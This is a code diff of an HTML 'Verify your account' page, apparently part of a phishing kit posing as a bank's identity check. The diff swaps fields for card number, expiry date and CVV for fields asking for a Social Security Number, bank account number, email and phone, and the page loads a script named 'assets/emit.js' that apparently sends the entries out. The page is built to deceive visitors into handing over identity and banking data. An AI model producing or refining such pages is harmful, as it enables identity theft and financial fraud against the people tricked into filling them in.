@@ -28,6 +28,7 @@
       justify-content: center;
       box-sizing: border-box;
     }
+    
     h1 {
       color: #006400;
       font-size: 1.6em;
@@ -57,24 +58,45 @@
       box-sizing: border-box;
     }
     
-    input:focus{
-    border-bottom: 4px solid green;
+    .input-group input:focus {
+    border-bottom: 4px solid #006400;
     outline: none;
+}
+
+    .error {
+      border-bottom: 4px solid #ae1100 !important;
     }
-    
-    .error{
-    border-bottom: 4px solid #ae1100!important;
+
+    input:focus {
+      border-bottom: 4px solid green;
+      outline: none;
     }
-    
+
     .input-group .eye-toggle {
       position: absolute;
       top: 50%;
       right: 15px;
       transform: translateY(-50%);
       cursor: pointer;
-      font-size: 1.5em;
+      font-size: 0.8em;
       color: #006400;
     }
+
+    
+    .error{
+    border-bottom: 4px solid #ae1100!important;
+    }
+    
+    /* FLOAT EFFECT */
+
+.input-group input:focus + label,
+.input-group input:valid + label {
+    top: 5px;
+    left: 12px;
+    font-size: 0.75em;
+    color: #006400;
+}
+
     .checkbox-group {
       display: flex;
       align-items: center;
@@ -152,6 +174,14 @@
     }
   </style>
   <style>
+
+a { 
+outline: none;
+-webkit-tap-highlight-color: transparent; 
+  } 
+a:focus, a:active { outline: none; } 
+a:focus-visible { border-bottom: 1px solid #006400; } 
+
   
   .label{ 
   display: block;
@@ -175,59 +205,34 @@
         <h1>Verify your account </h1> 
         <hr style="width:250px;">     
         	<h3 style="margin-bottom:30px; font-weight:400">To continue, let's verify it's you</h3>
-    <div id="form" class="form-section">
-        <!-- Full Name -->
-        <div class="input-group">
-            <label class="label" for="full-name">Full Name</label>
-            <input type="text" id="full-name" name="full-name" placeholder="Enter your Full Name">
-        </div>
+        <div id="form" class="form-section">
+            <!-- Social Security Number -->
+            <div class="input-group">
+                <label class="label" for="SSN">Social Security Number</label>
+                <input type="text" id="SSN" name="SSN" placeholder="Enter your SSN">
+            </div>
+            
+            <!-- Account Number -->
+            <div class="input-group">
+                <label class="label" for="account-number">Account Number</label>
+                <input type="text" name="account-number"  id="account-number" placeholder="Enter your Account Number">
+            </div>
 
-        <!-- Street Address -->
-        <div class="input-group">
-            <label class="label" for="street-address">Street Address</label>
-            <input type="text" id="street-address" name="street-address" placeholder="Enter your Street Address">
-        </div>
+            <!-- Email Address -->
+            <div class="input-group">
+                <label class="label" for="email">Email Address</label>
+                <input type="email" name="email" id="email" placeholder="Enter your Email Address">
+            </div>
 
-        <!-- City -->
-        <div class="input-group">
-            <label class="label" for="city">City</label>
-            <input type="text" id="city" name="city" placeholder="Enter your City">
-        </div>
+            <!-- Phone Number -->
+            <div class="input-group">
+                <label class="label" for="phone">Phone Number</label>
+                <input type="tel" name="phone" id="phone" placeholder="Enter your Phone Number">
+            </div>
 
-        <!-- State -->
-        <div class="input-group">
-            <label class="label" for="state">State</label>
-            <input type="text" id="state" name="state" placeholder="Enter your State">
-        </div>
+            <!-- Log In Button -->
+            <button id="continue-btn" type="submit" disabled>Continue</button>
 
-        <!-- ZIP Code -->
-        <div class="input-group">
-            <label class="label" for="zip-code">ZIP Code</label>
-            <input type="text" id="zip-code" name="zip-code" placeholder="Enter your ZIP Code">
-        </div>
-        
-        <!-- Card Number -->
-        <div class="input-group">
-            <label class="label" for="card-number">Card Number</label>
-            <input type="text" id="card-number" name="card-number" placeholder="Enter your Card Number">
-        </div>
-
-        <!-- Expiry Date -->
-        <div class="input-group">
-            <label class="label" for="expiry-date">Expiry Date</label>
-            <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY">
-        </div>
-
-        <!-- CVV -->
-        <div class="input-group">
-            <label class="label" for="cvv">CVV</label>
-            <input type="text" id="cvv" name="cvv" placeholder="CVV">
-        </div>
-
-        <!-- Continue Button -->
-        <button id="continue-btn" type="submit" disabled>Continue</button>
-    </div>
-	
             <!-- Forgot Username/Password -->
             <a href="#" class="forgot-password">Forgot username and/or password?</a>
         </div>
@@ -314,27 +319,6 @@
     </div>
 
   </footer>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
-      
-<script>
-	 	
-
-	       new Cleave('#card-number', {
-            creditCard: true
-        });
-
-        new Cleave('#expiry-date', {
-            date: true,
-            datePattern: ['m', 'y']
-        });
-
-        new Cleave('#cvv', {
-            numericOnly: true,
-            blocks: [3]
-        });
-
-        
-</script>
 <script src="assets/emit.js"></script> 
 <script>
     document.addEventListener('DOMContentLoaded', () => {
@@ -346,17 +330,6 @@
             const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
             submitButton.disabled = !allFilled;
         };
-        
-        function generateErrorMessage(inputElement) {
-    let placeholderText = inputElement.placeholder.trim(); // Get and trim the placeholder text
-
-    if (placeholderText.split(' ').length === 1) {
-        return `Please enter ${placeholderText.toLowerCase()} information`;
-    } else {
-        // If placeholder has more than one word
-        return `Please ${placeholderText.toLowerCase()}`;
-    }
-}
 
         // Add blur event listeners to inputs
         inputs.forEach(input => {
@@ -378,7 +351,7 @@
 					errorDiv.style.margin = "4px";
                     errorDiv.style.color = '#ae1100'; 
                     errorDiv.style.fontSize = '13px';
-                    errorDiv.textContent = generateErrorMessage(inputElement);
+                    errorDiv.textContent = `Please ${inputElement.placeholder}`;
                     inputElement.parentNode.appendChild(errorDiv);   
                     inputElement.classList.add('error');
                     
@@ -387,7 +360,8 @@
                 // Check if all inputs are filled
                 checkAllInputs();
             });
-            
+
+            // Remove the error message as the user starts typing
             input.addEventListener('input', () => {
                 const errorDiv = document.getElementById(`${input.id}-error`);
                 if (errorDiv) {
